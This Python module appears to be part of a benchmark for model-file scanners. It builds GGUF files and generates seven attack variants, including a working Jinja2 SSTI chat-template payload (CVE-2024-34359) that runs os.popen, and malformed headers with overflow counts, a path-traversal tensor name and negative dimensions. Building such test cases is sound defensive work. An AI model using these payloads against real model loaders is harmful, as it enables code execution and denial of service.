"""Task 3 -- GGUF format tools: minimal builder and the malformed-header /
Jinja2-SSTI attack generators.

Format follows the ggml-org GGUF v3 specification
(https://github.com/ggml-org/ggml/blob/master/docs/gguf.md), cross-checked
against the attack technique demonstrated by the public
vellaveto/gguf-scanner-bypass-poc payloads:

  header:   magic "GGUF" (u32), version (u32), tensor_count (u64), kv_count (u64)
  kv entry: key   [u64 len][bytes]
            value [u32 type][value...]   (STRING=8 -> [u64 len][bytes])
  tensor:   name [u64 len][bytes], n_dims (u32), dims[u64*n], ggml_type (u32),
            offset (u64)

All values are little-endian. ``GgufAttack`` families:

  * ``ssti_chat_template``  -- JFrog "Llama Drama" CVE-2024-34359: the
    ``tokenizer.chat_template`` metadata is a Jinja2 SSTI payload that runs
    ``os.popen`` when rendered by an unsandboxed Jinja2 engine (the
    llama-cpp-python < 0.2.72 path).
  * the six malformed-header families that reproduce the vellaveto attack
    *technique* (all MISSED by modelscan 0.8.8): ``nkv_overflow``,
    ``ntensors_overflow``, ``string_overflow``, ``path_traversal``,
    ``negative_dims``, ``version_zero``.
"""

from __future__ import annotations

import struct
from typing import Any


GGUF_MAGIC = b"GGUF"
GGUF_VERSION = 3

# gguf_metadata_value_type
UINT8, INT8, UINT16, INT16 = 0, 1, 2, 3
UINT32, INT32, FLOAT32 = 4, 5, 6
BOOL, STRING, ARRAY = 7, 8, 9
UINT64, INT64, FLOAT64 = 10, 11, 12

# ggml_type (subset used by builders)
GGML_F32, GGML_F16 = 0, 1

_OVERFLOW_SENTINEL = 0x7FFFFFFFFFFFFFFF


class GGUFError(Exception):
    """Raised when a GGUF byte stream is malformed or truncated."""


def _u32(v: int) -> bytes:
    return struct.pack("<I", v)


def _u64(v: int) -> bytes:
    return struct.pack("<Q", v)


def _pack_string(s: str) -> bytes:
    b = s.encode("utf-8")
    return _u64(len(b)) + b


def _pack_value(value: Any) -> bytes:
    """Encode a Python value into a GGUF metadata value (no type prefix).

    ``value`` may be a plain Python value (auto-typed: str->STRING,
    bool->BOOL, int->UINT64, float->FLOAT64) or a ``(gguf_type, value)`` tuple
    to force a specific gguf_metadata_value_type.
    """
    if isinstance(value, tuple) and len(value) == 2 and isinstance(value[0], int):
        vtype, payload = value
        return _u32(vtype) + _pack_array_elem(vtype, payload)
    if isinstance(value, str):
        return _u32(STRING) + _pack_string(value)
    if isinstance(value, bool):
        return _u32(BOOL) + (b"\x01" if value else b"\x00")
    if isinstance(value, int):
        return _u32(UINT64) + _u64(value)
    if isinstance(value, float):
        return _u32(FLOAT64) + struct.pack("<d", value)
    if isinstance(value, (list, tuple)):
        if not value:
            return _u32(ARRAY) + _u32(UINT8) + _u64(0)
        elem = value[0]
        if isinstance(elem, str):
            et = STRING
        elif isinstance(elem, bool):
            et = BOOL
        elif isinstance(elem, int):
            et = UINT64
        elif isinstance(elem, float):
            et = FLOAT64
        else:
            raise GGUFError(f"unsupported array element type: {type(elem)}")
        body = _u32(et) + _u64(len(value)) + b"".join(
            _pack_array_elem(et, v) for v in value)
        return _u32(ARRAY) + body
    raise GGUFError(f"unsupported metadata value type: {type(value)}")


def _pack_array_elem(elem_type: int, value: Any) -> bytes:
    if elem_type == STRING:
        return _pack_string(value)
    if elem_type == BOOL:
        return b"\x01" if value else b"\x00"
    if elem_type in (UINT8, INT8):
        return struct.pack("<B", int(value))
    if elem_type in (UINT16, INT16):
        return struct.pack("<H", int(value))
    if elem_type in (UINT32, INT32, FLOAT32):
        return struct.pack("<I", int(value))
    if elem_type in (UINT64, INT64, FLOAT64):
        return struct.pack("<Q", int(value))
    raise GGUFError(f"unsupported element type id: {elem_type}")


def _pack_tensor_info(name: str, dims: list[int], ggml_type: int = GGML_F32,
                      offset: int = 0) -> bytes:
    return (
        _pack_string(name)
        + _u32(len(dims))
        + b"".join(_u64(d) for d in dims)
        + _u32(ggml_type)
        + _u64(offset)
    )


def build_gguf(kv: list[tuple[str, Any]], tensor_count: int = 0,
               tensor_infos: list[bytes] | None = None,
               version: int = GGUF_VERSION) -> bytes:
    """Assemble a GGUF byte stream from ordered metadata KV pairs."""
    parts = [
        GGUF_MAGIC,
        _u32(version),
        _u64(tensor_count),
        _u64(len(kv)),
    ]
    for key, value in kv:
        parts.append(_pack_string(key))
        parts.append(_pack_value(value))
    for info in tensor_infos or []:
        parts.append(info)
    return b"".join(parts)


# --- benign model template -------------------------------------------------

def benign_gguf(chat_template: str = "") -> bytes:
    """A structurally valid minimal GGUF (metadata-only, zero tensors) used as
    the benign seed and as the carrier for the SSTI chat_template payload."""
    kv = [
        ("general.architecture", "llama"),
        ("general.name", "regenbench-minimal"),
        ("general.alignment", (UINT32, 32)),
        ("general.quantization_version", (UINT32, 2)),
        ("llama.context_length", 2048),
        ("llama.embedding_length", 128),
        ("llama.block_count", (UINT32, 4)),
        ("llama.feed_forward_length", (UINT32, 512)),
        ("llama.attention.head_count", (UINT32, 8)),
        ("llama.attention.layer_norm_rms_epsilon", (FLOAT32, 1.0e-5)),
        ("tokenizer.ggml.model", "llama"),
        ("tokenizer.ggml.bos_token_id", (UINT32, 1)),
        ("tokenizer.ggml.eos_token_id", (UINT32, 2)),
        ("tokenizer.ggml.tokens", ["<s>", "</s>", "hello", "world"]),
    ]
    if chat_template:
        kv.append(("tokenizer.chat_template", chat_template))
    return build_gguf(kv, tensor_count=0)


# --- attack generators -----------------------------------------------------

def _ssti_payload(trigger_path: str) -> str:
    """The JFrog "Llama Drama" (CVE-2024-34359) Jinja2 SSTI payload, modified
    to write the per-candidate sentinel instead of /tmp/retr0reg."""
    return (
        "{% for x in ().__class__.__base__.__subclasses__() %}"
        '{% if "warning" in x.__name__ %}'
        "{{x()._module.__builtins__['__import__']('os').popen("
        f'"touch {trigger_path}"'
        ")}}{%endif%}{% endfor %}"
    )


def generate_candidate_gguf(attack: str, trigger_path: str | None = None) -> bytes:
    """Generate a malicious GGUF for the requested attack family.

    * ``ssti_chat_template``  -- benign GGUF whose tokenizer.chat_template is
      the Jinja2 SSTI payload (writes ``trigger_path`` when rendered).
    * ``nkv_overflow``        -- kv_count = 2^63-1 (heap allocation bomb).
    * ``ntensors_overflow``   -- tensor_count = 2^63-1.
    * ``string_overflow``     -- first KV key length = 2^63-1 with short data.
    * ``path_traversal``      -- tensor name ``../../../etc/passwd``.
    * ``negative_dims``       -- tensor dimensions signed -1.
    * ``version_zero``        -- GGUF version 0.
    """
    if attack == "ssti_chat_template":
        return benign_gguf(chat_template=_ssti_payload(trigger_path or "/tmp/trig.txt"))

    # The malformed families reproduce the vellaveto attack *technique*
    # (sentinel counts, overflow length prefixes, version 0, traversal names,
    # negative dims). They are minimal fixed-size payloads demonstrating the
    # technique, not byte-identical copies of the PoC files.
    header_magic = GGUF_MAGIC
    if attack == "nkv_overflow":
        return header_magic + struct.pack("<IQQ", 3, 0, _OVERFLOW_SENTINEL)
    if attack == "ntensors_overflow":
        return header_magic + struct.pack("<IQQ", 3, _OVERFLOW_SENTINEL, 0)
    if attack == "version_zero":
        return header_magic + struct.pack("<IQQ", 0, 0, 0)
    if attack == "string_overflow":
        return header_magic + struct.pack("<IQQ", 3, 0, 1) + _u64(_OVERFLOW_SENTINEL) + b"short"
    if attack == "path_traversal":
        body = (
            _pack_string("general.architecture") + _u32(STRING) + _pack_string("llama")
            + _pack_string("../../../etc/passwd")
            + _u32(1) + _u64(4) + _u32(GGML_F32) + _u64(0)
        )
        return header_magic + struct.pack("<IQQ", 3, 1, 1) + body
    if attack == "negative_dims":
        body = (
            _pack_string("general.architecture") + _u32(STRING) + _pack_string("llama")
            + _pack_string("weight")
            + _u32(2) + _u64(0xFFFFFFFFFFFFFFFF) + _u64(0xFFFFFFFFFFFFFFFF)
            + _u32(GGML_F32) + _u64(0)
        )
        return header_magic + struct.pack("<IQQ", 3, 1, 1) + body

    raise GGUFError(f"unknown gguf attack family: {attack}")


# Stable family ids / labels for the demo + DB.
GGUF_ATTACKS: tuple[str, ...] = (
    "ssti_chat_template",
    "nkv_overflow",
    "ntensors_overflow",
    "string_overflow",
    "path_traversal",
    "negative_dims",
    "version_zero",
)

GGUF_ATTACK_LABELS: dict[str, str] = {
    "ssti_chat_template": "gguf_ssti_chat_template",
    "nkv_overflow": "gguf_malformed_nkv_overflow",
    "ntensors_overflow": "gguf_malformed_ntensors_overflow",
    "string_overflow": "gguf_malformed_string_overflow",
    "path_traversal": "gguf_malformed_path_traversal",
    "negative_dims": "gguf_malformed_negative_dims",
    "version_zero": "gguf_malformed_version_zero",
}
